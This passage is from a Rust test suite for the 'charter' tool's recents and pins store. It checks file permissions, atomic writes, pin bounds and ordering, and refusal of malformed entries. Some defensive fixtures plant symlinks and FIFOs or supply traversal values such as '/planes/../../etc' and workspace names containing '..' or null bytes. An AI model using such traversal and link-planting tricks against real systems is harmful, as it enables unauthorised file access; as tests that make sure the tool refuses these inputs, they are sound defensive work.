        store.approve(plane, 1, Contribution::default());
        store.vouch(plane, a_launch(&["/bin/zsh"]), 2);
        write(machine.path(), &store).unwrap();

        let back = read(machine.path());

        assert_eq!(
            back.store.consent(plane, &a_launch(&["/bin/zsh"])),
            Consent::Unchanged
        );
        assert!(
            back.store
                .consent(plane, &a_launch(&["/bin/sh"]))
                .must_ask(),
            "the launch fingerprint did not survive the round trip"
        );
    }

    // ------------------------------------------------------------- where it lives

    #[test]
    fn the_config_home_is_the_one_charter_report_already_uses() {
        let home = Some(PathBuf::from("/home/aharon"));
        let set = |value: &str| Some(std::ffi::OsString::from(value));

        assert_eq!(
            rooted(set("/isolated"), set("/xdg"), home.clone()),
            Some(PathBuf::from("/isolated")),
            "CHARTER_CONFIG_HOME wins, so charter can be isolated without logging `gh` out"
        );
        assert_eq!(
            rooted(None, set("/xdg"), home.clone()),
            Some(PathBuf::from("/xdg"))
        );
        assert_eq!(
            rooted(None, None, home.clone()),
            Some(PathBuf::from("/home/aharon/.config")),
            "report.py:consent_path's last rung"
        );
        assert_eq!(
            rooted(set(""), set(""), home),
            Some(PathBuf::from("/home/aharon/.config")),
            "an exported-but-blank variable is unset"
        );
        assert_eq!(rooted(None, None, None), None, "no home, no store");
    }

    // ---------------------------------------------------------------- the mode

    #[test]
    fn the_store_is_0600_in_a_0700_directory() {
        let machine = machine();

        write(machine.path(), &one_plane()).unwrap();

        assert_eq!(mode_of(&file(machine.path())), 0o600);
        assert_eq!(mode_of(&dir(machine.path())), 0o700);
    }

    #[test]
    fn the_mode_is_charters_and_not_whatever_the_umask_left() {
        // Without this the test above passes on a machine whose umask happens to be 077 even
        // with every mode dropped. A control made the ordinary way, in the same directory,
        // under the same umask: if the two ever match, this fails rather than quietly
        // vouching for nothing.
        let machine = machine();
        write(machine.path(), &one_plane()).unwrap();
        let control = dir(machine.path()).join("control");
        std::fs::write(&control, b"x").unwrap();

        assert_ne!(
            mode_of(&file(machine.path())),
            mode_of(&control),
            "charter's mode and the umask's are the same, so this suite proves nothing \
             about the mode: run it under a umask that is not 077"
        );
    }

    #[test]
    fn a_directory_that_was_already_there_at_0755_is_tightened() {
        // charter's own directory, at a path charter alone decides — unlike a plane's state
        // directory, which `$CHARTER_HOME` may point at a share.
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::set_permissions(dir(machine.path()), std::fs::Permissions::from_mode(0o755))
            .unwrap();

        write(machine.path(), &one_plane()).unwrap();

        assert_eq!(mode_of(&dir(machine.path())), 0o700);
    }

    #[test]
    fn the_config_home_itself_is_not_re_moded_by_charter() {
        // `~/.config` belongs to the operator and to every application on the machine.
        let held = machine();
        let data = held.path().join("share");
        std::fs::create_dir_all(&data).unwrap();
        std::fs::set_permissions(&data, std::fs::Permissions::from_mode(0o755)).unwrap();

        write(&data, &one_plane()).unwrap();

        assert_eq!(mode_of(&data), 0o755);
    }

    // ---------------------------------------------------------------- the gate

    #[test]
    fn a_link_at_the_store_itself_is_not_read_through() {
        let machine = machine();
        let elsewhere = machine.path().join("elsewhere.json");
        std::fs::write(&elsewhere, br#"{"version":1,"at":0,"recents":[]}"#).unwrap();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::os::unix::fs::symlink(&elsewhere, file(machine.path())).unwrap();

        let back = read(machine.path());

        assert!(
            back.unreadable.is_some(),
            "a linked store was read as this machine's"
        );
    }

    #[test]
    fn a_link_at_charters_own_directory_is_not_read_through() {
        let machine = machine();
        let elsewhere = machine.path().join("elsewhere");
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::fs::write(
            elsewhere.join(FILE),
            br#"{"version":1,"at":0,"recents":[{"plane":"/planted","opened":0}]}"#,
        )
        .unwrap();
        std::os::unix::fs::symlink(&elsewhere, dir(machine.path())).unwrap();

        let back = read(machine.path());

        assert!(back.unreadable.is_some(), "{back:?}");
        assert_eq!(back.store, Store::default());
    }

    #[test]
    fn a_store_that_is_a_link_is_refused_and_what_it_points_at_is_untouched() {
        // #434: a link at the store's own name used to be replaced by the rename; it is now
        // refused, as every whole-file writer refuses one. The temp file the bytes land on is
        // gated by the same walk (`rewrite`'s own tests plant links there).
        let machine = machine();
        let theirs = machine.path().join("theirs.json");
        std::fs::write(&theirs, "THEIRS\n").unwrap();
        let dir = private_dir(machine.path()).unwrap();
        std::os::unix::fs::symlink(&theirs, dir.join(FILE)).unwrap();

        let refused = write(machine.path(), &one_plane());

        assert!(refused.is_err(), "a linked store was written");
        assert_eq!(std::fs::read_to_string(&theirs).unwrap(), "THEIRS\n");
        assert!(dir.join(FILE).is_symlink());
    }

    #[test]
    fn a_store_write_that_dies_before_its_rename_leaves_the_old_store_whole() {
        let machine = machine();
        let dir = private_dir(machine.path()).unwrap();
        std::fs::write(dir.join(FILE), "old\n").unwrap();
        let _killed = crate::rewrite::hook::set(|_, _| Err(io::Error::other("killed")));

        assert!(write(machine.path(), &one_plane()).is_err());

        assert_eq!(std::fs::read_to_string(dir.join(FILE)).unwrap(), "old\n");
        let names: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        assert_eq!(names, [FILE], "no temp was left beside the store");
    }

    #[test]
    fn a_write_through_a_linked_directory_is_refused_at_the_moment_of_the_create() {
        let machine = machine();
        let elsewhere = machine.path().join("elsewhere");
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::os::unix::fs::symlink(&elsewhere, dir(machine.path())).unwrap();

        let refused = write(machine.path(), &one_plane());

        assert!(refused.is_err(), "the store was written through a link");
        assert!(!elsewhere.join(FILE).exists());
    }

    #[test]
    fn a_store_that_is_not_a_plain_file_is_refused_instead_of_read_for_ever() {
        // A FIFO is not a link, so a link check waves it through, and `read_to_string` on one
        // never returns — at a cold launch, before there is a window to close.
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        let made =
            crate::forklock::status(std::process::Command::new("mkfifo").arg(file(machine.path())))
                .expect("mkfifo runs");
        assert!(made.success(), "the test needs a fifo to plant");

        // In a thread, because the whole point is that the unguarded version never returns.
        let (say, heard) = std::sync::mpsc::channel();
        let asked = machine.path().to_path_buf();
        std::thread::spawn(move || say.send(read(&asked).unreadable));
        let answered = heard
            .recv_timeout(Duration::from_secs(5))
            .expect("reading a fifo store must not block a launch");

        assert!(answered.is_some(), "a fifo store was accepted");
    }

    #[test]
    fn a_store_too_large_to_be_one_is_refused_rather_than_read_whole() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        let planted = std::fs::File::create(file(machine.path())).unwrap();
        planted.set_len(MAX_BYTES + 1).unwrap();

        let back = read(machine.path());

        assert!(
            back.unreadable
                .is_some_and(|why| why.contains("never larger than")),
            "an oversized store was read whole"
        );
    }

    #[test]
    fn a_store_charter_could_not_read_is_never_overwritten() {
        let machine = machine();
        let captured = machine.path().join("captured.json");
        std::fs::write(&captured, b"the operator's other file").unwrap();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::os::unix::fs::symlink(&captured, file(machine.path())).unwrap();

        let refused = update(machine.path(), |store| {
            store.remember(Path::new("/planes/new"), 1)
        });

        assert!(refused.is_err(), "an unreadable store was clobbered");
        assert_eq!(
            std::fs::read_to_string(&captured).unwrap(),
            "the operator's other file",
            "the file behind the link was rewritten"
        );
    }

    #[test]
    fn a_store_charter_could_read_and_did_not_understand_is_replaced() {
        // The other half of the rule above, and the reason the two are told apart: content
        // that says nothing is worth replacing, a path charter cannot read is not.
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(file(machine.path()), b"not json at all").unwrap();

        let done = update(machine.path(), |store| {
            store.remember(Path::new("/planes/new"), 1)
        })
        .expect("a malformed store is replaced, not a wall");

        assert!(matches!(done.dropped.as_slice(), [Dropped::TheStore(_)]));
        assert_eq!(read(machine.path()).store.recents.len(), 1);
    }

    #[test]
    fn a_store_of_another_version_is_not_guessed_at() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":99,"at":0,"recents":[{"plane":"/planes/old","opened":1}]}"#,
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store, Store::default());
        assert!(matches!(back.dropped.as_slice(), [Dropped::TheStore(_)]));
    }

    // ---------------------------------------------------------------- entries off the file

    #[test]
    fn a_remembered_path_that_is_not_absolute_is_dropped_with_a_reason() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[
                 {"plane":"relative/plane","opened":1},
                 {"plane":"/planes/good","opened":2}]}"#,
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store.recents.len(), 1, "{:?}", back.store.recents);
        assert_eq!(back.store.recents[0].plane, PathBuf::from("/planes/good"));
        assert!(
            back.dropped
                .iter()
                .any(|d| d.to_string().contains("relative/plane")),
            "a dropped row must say which one and why: {:?}",
            back.dropped
        );
    }

    #[test]
    fn a_remembered_path_that_walks_up_is_dropped() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[{"plane":"/planes/../../etc","opened":1}]}"#,
        )
        .unwrap();

        assert_eq!(read(machine.path()).store.recents, Vec::new());
    }

    #[test]
    fn one_malformed_entry_costs_one_row_and_not_the_list() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[
                 7,
                 {"plane":"/planes/good","opened":2}]}"#,
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store.recents.len(), 1);
        assert_eq!(back.dropped.len(), 1);
    }

    #[test]
    fn a_window_that_points_past_its_own_tabs_still_opens() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[],"windows":[
                 {"planes":["relative","/planes/good"],"active":1}]}"#,
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store.windows.len(), 1);
        assert_eq!(
            back.store.windows[0].planes,
            [PathBuf::from("/planes/good")]
        );
        assert_eq!(back.store.windows[0].active, 0);
    }

    #[test]
    fn a_plane_listed_twice_is_remembered_once() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[
                 {"plane":"/planes/a","opened":9},
                 {"plane":"/planes/a","opened":1}]}"#,
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store.recents.len(), 1);
        assert_eq!(
            back.store.recents[0].opened, 9,
            "the first one is the newest"
        );
    }

    #[test]
    fn a_file_holding_more_planes_than_charter_remembers_is_cut_to_the_bound() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        let rows: Vec<String> = (0..MOST_RECENTS + 5)
            .map(|n| format!(r#"{{"plane":"/planes/{n}","opened":{n}}}"#))
            .collect();
        std::fs::write(
            file(machine.path()),
            format!(r#"{{"version":1,"at":0,"recents":[{}]}}"#, rows.join(",")),
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store.recents.len(), MOST_RECENTS);
        assert_eq!(back.dropped.len(), 5);
    }

    // ------------------------------------------------- pins (ADR 0039, 0040)

    /// A store remembering `planes`, in the order they were opened.
    fn remembering(planes: &[&str]) -> Store {
        let mut store = Store::default();
        for (n, plane) in planes.iter().enumerate() {
            store.remember(Path::new(plane), n as u64);
        }
        store
    }

    #[test]
    fn a_pin_is_kept_on_the_plane_it_is_about() {
        let mut store = remembering(&["/planes/a", "/planes/b"]);

        assert_eq!(store.pin(Path::new("/planes/a"), true), Ok(true));

        assert!(store.recent(Path::new("/planes/a")).unwrap().pinned);
        assert!(!store.recent(Path::new("/planes/b")).unwrap().pinned);
    }

    #[test]
    fn pinning_what_is_already_pinned_changes_nothing() {
        let mut store = remembering(&["/planes/a"]);
        store.pin(Path::new("/planes/a"), true).unwrap();

        assert_eq!(store.pin(Path::new("/planes/a"), true), Ok(false));
    }

    #[test]
    fn a_plane_charter_does_not_remember_cannot_be_pinned() {
        // An entry that existed only to hold a pin would be a plane path in this file that no
        // open ever put there, which is a different kind of thing from the list this file is.
        let mut store = remembering(&["/planes/a"]);

        assert!(store.pin(Path::new("/planes/elsewhere"), true).is_err());
        assert_eq!(store.recents.len(), 1);
    }

    #[test]
    fn a_pinned_project_does_not_fall_off_the_end_of_the_recents() {
        // ADR 0040: a pin is the only thing an operator can say to mean "not this
        // one", so the sixty-fifth plane opened must not silently undo it.
        let mut store = remembering(&["/planes/kept"]);
        store.pin(Path::new("/planes/kept"), true).unwrap();

        for n in 0..MOST_RECENTS + 10 {
            store.remember(&PathBuf::from(format!("/planes/{n}")), 100 + n as u64);
        }

        assert!(store.recent(Path::new("/planes/kept")).is_some());
        assert_eq!(store.recents.len(), MOST_RECENTS + 1);
    }

    #[test]
    fn unpinning_lets_a_plane_past_the_bound_go() {
        let mut store = remembering(&["/planes/kept"]);
        store.pin(Path::new("/planes/kept"), true).unwrap();
        for n in 0..MOST_RECENTS + 10 {
            store.remember(&PathBuf::from(format!("/planes/{n}")), 100 + n as u64);
        }

        store.pin(Path::new("/planes/kept"), false).unwrap();

        assert!(store.recent(Path::new("/planes/kept")).is_none());
        assert_eq!(store.recents.len(), MOST_RECENTS);
    }

    #[test]
    fn there_is_a_bound_on_the_pins_as_well() {
        // The pin exempts an entry from the recents bound, so without one of its own the file
        // would have none — and it is read whole at a cold launch.
        let planes: Vec<String> = (0..MOST_PINNED + 1)
            .map(|n| format!("/planes/{n}"))
            .collect();
        let mut store = remembering(&planes.iter().map(String::as_str).collect::<Vec<_>>());

        for plane in planes.iter().take(MOST_PINNED) {
            assert_eq!(store.pin(Path::new(plane), true), Ok(true));
        }

        assert!(store.pin(Path::new(&planes[MOST_PINNED]), true).is_err());
    }

    #[test]
    fn a_workspace_pin_is_a_name_and_never_a_path() {
        let mut store = remembering(&["/planes/a"]);

        assert!(
            store
                .pin_workspace(Path::new("/planes/a"), "ide", true)
                .is_ok()
        );
        for refused in ["", "..", ".", "a/b", "a\\b", "a\0b"] {
            assert!(
                store
                    .pin_workspace(Path::new("/planes/a"), refused, true)
                    .is_err(),
                "{refused:?} was taken as a workspace name"
            );
        }
    }

    #[test]
    fn a_pinned_workspace_that_is_no_longer_there_is_named_rather_than_drawn() {
        // The hazard ADR 0034 names for a trust entry keyed on a path, one scope down: a
        // reference that no longer resolves must not become something charter offers.
        let mut store = remembering(&["/planes/a"]);
        store
            .pin_workspace(Path::new("/planes/a"), "ide", true)
            .unwrap();
        store
            .pin_workspace(Path::new("/planes/a"), "gone", true)
            .unwrap();

        let (kept, missing) = store.pinned_workspaces(Path::new("/planes/a"), &["fleet", "ide"]);

        assert_eq!(kept, ["ide"]);
        assert_eq!(missing, ["gone"]);
    }

    #[test]
    fn pinned_workspaces_come_back_in_the_order_they_were_pinned_in() {
        // The workspace strip draws its pins in pin order (ADR 0054, charter#402), so the
        // plane's own order — alphabetical here — must not win over the operator's.
        let mut store = remembering(&["/planes/a"]);
        for name in ["zeta", "alpha", "mu"] {
            store
                .pin_workspace(Path::new("/planes/a"), name, true)
                .unwrap();
        }

        let (kept, _) =
            store.pinned_workspaces(Path::new("/planes/a"), &["alpha", "beta", "mu", "zeta"]);

        assert_eq!(kept, ["zeta", "alpha", "mu"]);
    }

    #[test]
    fn unpinning_one_in_the_middle_keeps_the_others_order_and_a_repin_goes_last() {
        let mut store = remembering(&["/planes/a"]);
        let plane = Path::new("/planes/a");
        for name in ["zeta", "alpha", "mu"] {
            store.pin_workspace(plane, name, true).unwrap();
        }

        assert_eq!(store.pin_workspace(plane, "alpha", false), Ok(true));
        let (kept, _) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
        assert_eq!(kept, ["zeta", "mu"]);

        store.pin_workspace(plane, "alpha", true).unwrap();
        let (kept, _) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
        assert_eq!(kept, ["zeta", "mu", "alpha"]);
    }

    #[test]
    fn arranging_the_pinned_workspaces_puts_them_in_the_order_the_operator_dragged_them_to() {
        // Pin order was the order of pinning until the strip could be dragged (SI-6). Once
        // it can, the order the operator left it in is the order it is drawn in.
        let mut store = remembering(&["/planes/a"]);
        let plane = Path::new("/planes/a");
        for name in ["zeta", "alpha", "mu"] {
            store.pin_workspace(plane, name, true).unwrap();
        }

        assert_eq!(
            store.arrange_workspaces(plane, &["mu", "zeta", "alpha"]),
            Ok(true)
        );

        let (kept, _) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
        assert_eq!(kept, ["mu", "zeta", "alpha"]);
    }

    #[test]
    fn arranging_the_pins_in_the_order_they_already_have_changes_nothing() {
        let mut store = remembering(&["/planes/a"]);
        let plane = Path::new("/planes/a");
        for name in ["zeta", "alpha"] {
            store.pin_workspace(plane, name, true).unwrap();
        }

        assert_eq!(
            store.arrange_workspaces(plane, &["zeta", "alpha"]),
            Ok(false)
        );
    }

    #[test]
    fn arranging_never_pins_a_workspace_that_was_not_pinned() {
        // Pinning is its own act, with its own bound and its own refusal. An arrangement that
        // names a workspace nobody pinned has nothing to arrange about it.
        let mut store = remembering(&["/planes/a"]);
        let plane = Path::new("/planes/a");
        for name in ["zeta", "alpha"] {
            store.pin_workspace(plane, name, true).unwrap();
        }

        store
            .arrange_workspaces(plane, &["alpha", "ide", "zeta"])
            .unwrap();

        let (kept, _) = store.pinned_workspaces(plane, &["alpha", "ide", "zeta"]);
        assert_eq!(kept, ["alpha", "zeta"]);
    }

    #[test]
    fn a_pin_the_window_was_not_drawing_keeps_its_place_when_the_rest_are_arranged() {
        // A pin whose workspace has gone from disk is named, never drawn, so the window
        // arranges only the ones it drew. The dangling one is not the window's to move.
        let mut store = remembering(&["/planes/a"]);
        let plane = Path::new("/planes/a");
        for name in ["zeta", "gone", "alpha", "mu"] {
            store.pin_workspace(plane, name, true).unwrap();
        }

        store
            .arrange_workspaces(plane, &["mu", "alpha", "zeta"])
            .unwrap();

        let (kept, missing) = store.pinned_workspaces(plane, &["alpha", "mu", "zeta"]);
        assert_eq!(kept, ["mu", "alpha", "zeta"]);
        assert_eq!(missing, ["gone"]);
        assert_eq!(
            store.recent(plane).unwrap().pinned_workspaces,
            ["mu", "gone", "alpha", "zeta"]
        );
    }

    #[test]
    fn arranging_workspaces_in_a_plane_charter_does_not_remember_is_refused() {
        let mut store = remembering(&["/planes/a"]);

        assert!(
            store
                .arrange_workspaces(Path::new("/planes/b"), &["ide"])
                .is_err()
        );
    }

    #[test]
    fn pin_order_survives_being_written_and_read_back() {
        let machine = machine();
        let mut store = remembering(&["/planes/a"]);
        for name in ["zeta", "alpha", "mu"] {
            store
                .pin_workspace(Path::new("/planes/a"), name, true)
                .unwrap();
        }

        write(machine.path(), &store).unwrap();
        let back = read(machine.path()).store;

        let (kept, _) = back.pinned_workspaces(Path::new("/planes/a"), &["alpha", "mu", "zeta"]);
        assert_eq!(kept, ["zeta", "alpha", "mu"]);
    }

    #[test]
    fn a_store_written_before_pins_had_an_order_keeps_its_pins_in_the_planes_order() {
        // An older charter kept these as a set and wrote them sorted, which is the order the
        // plane lists its workspaces in. Upgrading must neither lose them nor reshuffle a
        // strip the operator already knows (charter#402). A name written twice is one pin.
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[
                 {"plane":"/planes/a","opened":1,"mostActivePinned":true,
                  "pinnedWorkspaces":["alpha","ide","ide","zeta"]}]}"#,
        )
        .unwrap();

        let mut back = read(machine.path()).store;

        let there = ["alpha", "beta", "ide", "zeta"];
        let (kept, _) = back.pinned_workspaces(Path::new("/planes/a"), &there);
        assert_eq!(kept, ["alpha", "ide", "zeta"]);
        // And the next pin goes after them, as any pin does.
        back.pin_workspace(Path::new("/planes/a"), "beta", true)
            .unwrap();
        let (kept, _) = back.pinned_workspaces(Path::new("/planes/a"), &there);
        assert_eq!(kept, ["alpha", "ide", "zeta", "beta"]);
    }

    /// A plane on disk holding these workspaces, each last active at the second given: its
    /// `workspace.md` was last written then, which is what `briefing`'s `last_active` reads.
    fn a_plane_with_workspaces(at: &Path, active: &[(&str, u64)]) -> PathBuf {
        let plane = a_plane(at);
        for (name, when) in active {
            let charter = plane.join("workspaces").join(name).join("workspace.md");
            std::fs::create_dir_all(charter.parent().unwrap()).unwrap();
            std::fs::write(&charter, "").unwrap();
            std::fs::File::options()
                .write(true)
                .open(&charter)
                .unwrap()
                .set_modified(std::time::UNIX_EPOCH + Duration::from_secs(*when))
                .unwrap();
        }
        plane
    }

    #[test]
    fn the_first_open_pins_the_three_most_recently_active_workspaces() {
        let planes = tempfile::tempdir().unwrap();
        let plane = a_plane_with_workspaces(
            &planes.path().join("p"),
            &[
                ("alpha", 1_000),
                ("beta", 4_000),
                ("gamma", 2_000),
                ("delta", 3_000),
            ],
        );
        let mut store = Store::default();
        store.remember(&plane, 1);

        assert!(store.pin_the_most_active(&plane));

        let (kept, _) = store.pinned_workspaces(&plane, &["alpha", "beta", "delta", "gamma"]);
        assert_eq!(kept, ["beta", "delta", "gamma"]);
    }

    #[test]
    fn the_most_active_are_pinned_once_and_never_again_after_everything_is_unpinned() {
        // An operator who unpinned everything said so. A strip that pinned again at the next
        // launch would be the one that pins on its own, which ADR 0054 refuses.
        let machine = machine();
        let planes = tempfile::tempdir().unwrap();
        let plane = a_plane_with_workspaces(
            &planes.path().join("p"),
            &[("alpha", 1_000), ("beta", 2_000)],
        );
        let mut store = Store::default();
        store.remember(&plane, 1);
        store.pin_the_most_active(&plane);
        for name in ["alpha", "beta"] {
            store.pin_workspace(&plane, name, false).unwrap();
        }
        write(machine.path(), &store).unwrap();
        let mut back = read(machine.path()).store;

        assert!(!back.pin_the_most_active(&plane));

        let (kept, _) = back.pinned_workspaces(&plane, &["alpha", "beta"]);
        assert!(kept.is_empty(), "{kept:?}");
    }

    #[test]
    fn a_plane_the_operator_already_pinned_in_is_left_as_they_arranged_it() {
        // Their pins are their arrangement. Adding three they did not choose would be the
        // strip rearranging itself, so the one-time pinning is spent without pinning anything,
        // and unpinning later does not set it off either.
        let planes = tempfile::tempdir().unwrap();
        let plane = a_plane_with_workspaces(
            &planes.path().join("p"),
            &[("alpha", 1_000), ("beta", 2_000), ("gamma", 3_000)],
        );
        let mut store = Store::default();
        store.remember(&plane, 1);
        store.pin_workspace(&plane, "alpha", true).unwrap();

        assert!(!store.pin_the_most_active(&plane));
        let (kept, _) = store.pinned_workspaces(&plane, &["alpha", "beta", "gamma"]);
        assert_eq!(kept, ["alpha"]);

        store.pin_workspace(&plane, "alpha", false).unwrap();
        assert!(!store.pin_the_most_active(&plane));
        let (kept, _) = store.pinned_workspaces(&plane, &["alpha", "beta", "gamma"]);
        assert!(kept.is_empty(), "{kept:?}");
    }

    #[test]
    fn a_workspace_made_after_the_first_open_is_pinned_beside_the_most_active() {
        // The window pins a workspace it made (ADR 0054). That is the operator's pin, and it
        // must not set the one-time pinning off again over the ones they left unpinned.
        let planes = tempfile::tempdir().unwrap();
        let plane = a_plane_with_workspaces(
            &planes.path().join("p"),
            &[
                ("alpha", 1_000),
                ("beta", 2_000),
                ("gamma", 3_000),
                ("delta", 4_000),
            ],
        );
        let mut store = Store::default();
        store.remember(&plane, 1);
        store.pin_the_most_active(&plane);
        a_plane_with_workspaces(&plane, &[("epsilon", 5_000)]);

        assert_eq!(store.pin_workspace(&plane, "epsilon", true), Ok(true));
        assert!(!store.pin_the_most_active(&plane));

        // The one-time pins in the order charter pinned them, most active first, and the
        // operator's own after them.
        let there = ["alpha", "beta", "delta", "epsilon", "gamma"];
        let (kept, _) = store.pinned_workspaces(&plane, &there);
        assert_eq!(kept, ["delta", "gamma", "beta", "epsilon"]);
    }

    #[test]
    fn a_store_with_nothing_pinned_is_the_file_charter_wrote_before_pins_existed() {
        // The fields are left out at their defaults, so an older charter reading this file
        // sees exactly what it used to and this one reads their absence as "nothing pinned".
        let machine = machine();
        let mut store = Store::default();
        store.remember(Path::new("/planes/a"), 7);

        write(machine.path(), &store).unwrap();

        let text = std::fs::read_to_string(file(machine.path())).unwrap();
        assert!(!text.contains("pinned"), "{text}");
    }

    #[test]
    fn a_pin_survives_being_written_and_read_back() {
        let machine = machine();
        let mut store = Store::default();
        store.remember(Path::new("/planes/a"), 7);
        store.pin(Path::new("/planes/a"), true).unwrap();
        store
            .pin_workspace(Path::new("/planes/a"), "ide", true)
            .unwrap();

        write(machine.path(), &store).unwrap();
        let back = read(machine.path());

        let entry = back.store.recent(Path::new("/planes/a")).unwrap();
        assert!(entry.pinned);
        assert_eq!(
            entry.pinned_workspaces.iter().collect::<Vec<_>>(),
            [&"ide".to_owned()]
        );
    }

    #[test]
    fn a_pinned_workspace_charter_would_not_write_is_dropped_with_its_reason() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[
                 {"plane":"/planes/a","opened":1,
                  "pinnedWorkspaces":["ide","../elsewhere","a/b",7]}]}"#,
        )
        .unwrap();

        let back = read(machine.path());

        let entry = back.store.recent(Path::new("/planes/a")).unwrap();
        assert_eq!(
            entry.pinned_workspaces.iter().collect::<Vec<_>>(),
            [&"ide".to_owned()]
        );
        assert_eq!(
            back.dropped
                .iter()
                .filter(|why| matches!(why, Dropped::Pin { .. }))
                .count(),
            3
        );
    }

    #[test]
    fn a_pin_that_is_not_a_boolean_is_not_a_pin() {
        // The safe direction: the entry then spends the recents bound like any other, so a
        // malformed file cannot grow the bound on a file read at a cold launch.
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        std::fs::write(
            file(machine.path()),
            br#"{"version":1,"at":0,"recents":[{"plane":"/planes/a","opened":1,"pinned":"yes"}]}"#,
        )
        .unwrap();

        let back = read(machine.path());

        assert!(!back.store.recent(Path::new("/planes/a")).unwrap().pinned);
    }

    #[test]
    fn a_file_claiming_more_pins_than_charter_keeps_is_cut_to_the_bound() {
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        let rows: Vec<String> = (0..MOST_PINNED + 5)
            .map(|n| format!(r#"{{"plane":"/planes/{n}","opened":{n},"pinned":true}}"#))
            .collect();
        std::fs::write(
            file(machine.path()),
            format!(r#"{{"version":1,"at":0,"recents":[{}]}}"#, rows.join(",")),
        )
        .unwrap();

        let back = read(machine.path());

        assert_eq!(back.store.recents.len(), MOST_PINNED);
        assert_eq!(back.dropped.len(), 5);
    }

    #[test]
    fn a_pinned_plane_read_back_does_not_spend_the_recents_bound() {
        // The mirror of the write-side rule: the two bounds are counted apart in all three
        // places the file's size is decided, and a file that held both must come back whole.
        let machine = machine();
        std::fs::create_dir_all(dir(machine.path())).unwrap();
        let mut rows: Vec<String> = (0..MOST_RECENTS)
            .map(|n| format!(r#"{{"plane":"/planes/{n}","opened":{n}}}"#))
            .collect();
        rows.push(r#"{"plane":"/planes/kept","opened":1,"pinned":true}"#.to_owned());
        std::fs::write(
            file(machine.path()),
            format!(r#"{{"version":1,"at":0,"recents":[{}]}}"#, rows.join(",")),
        )
        .unwrap();

        let back = read(machine.path());

        assert!(back.store.recent(Path::new("/planes/kept")).is_some());
        assert_eq!(back.store.recents.len(), MOST_RECENTS + 1);
        assert!(back.dropped.is_empty());
    }

    #[test]
    fn forgetting_a_plane_forgets_its_pins_with_it() {
        // The same rule the approval follows: one entry, so there is never a second list of
        // pins to go stale against the list of planes.
        let mut store = remembering(&["/planes/a"]);
        store.pin(Path::new("/planes/a"), true).unwrap();
        store
            .pin_workspace(Path::new("/planes/a"), "ide", true)
            .unwrap();

        store.forget(Path::new("/planes/a"));
        store.remember(Path::new("/planes/a"), 9);

        let entry = store.recent(Path::new("/planes/a")).unwrap();
        assert!(!entry.pinned);
        assert!(entry.pinned_workspaces.is_empty());
    }

    #[test]
    fn opening_a_pinned_plane_again_keeps_its_pins() {
        // `remember` rebuilds the entry, and an open is not an unpin any more than it is an
        // approval.
        let mut store = remembering(&["/planes/a"]);
        store.pin(Path::new("/planes/a"), true).unwrap();
        store
            .pin_workspace(Path::new("/planes/a"), "ide", true)
            .unwrap();

        store.remember(Path::new("/planes/a"), 99);

        let entry = store.recent(Path::new("/planes/a")).unwrap();
        assert!(entry.pinned);
        assert_eq!(entry.pinned_workspaces, ["ide"]);
    }

    // ---------------------------------------------------------------- the disk question

    #[test]
    fn a_path_that_is_not_utf_8_is_not_remembered_as_a_lossy_one() {
        // `display()` substitutes U+FFFD for a byte that is not UTF-8, so writing that
        // rendering would remember a path that is not the one the operator opened — and
        // later open it. JSON holds a string; a path that is not one is simply not kept.
        use std::os::unix::ffi::OsStrExt;
        let machine = machine();
        let mut store = Store::default();
        store.remember(
            Path::new(std::ffi::OsStr::from_bytes(b"/planes/not\xffutf8")),
            1,
        );
        store.remember(Path::new("/planes/ordinary"), 2);

        write(machine.path(), &store).unwrap();
        let back = read(machine.path());

        assert_eq!(
            back.store.recents.len(),
            1,
            "{:?} — a lossy path was written",
            back.store.recents
        );
        assert_eq!(
            back.store.recents[0].plane,
            PathBuf::from("/planes/ordinary")
        );
    }

    #[test]
    fn a_remembered_plane_that_is_still_a_plane_is_usable() {
        let held = machine();
        let plane = a_plane(&held.path().join("plane"));

        assert_eq!(still_a_plane(&plane), Ok(()));
    }

    #[test]
    fn a_remembered_plane_that_moved_or_stopped_being_one_is_dropped_with_a_reason() {
        let held = machine();
        let gone = held.path().join("gone");
        let not_a_plane = held.path().join("ordinary");
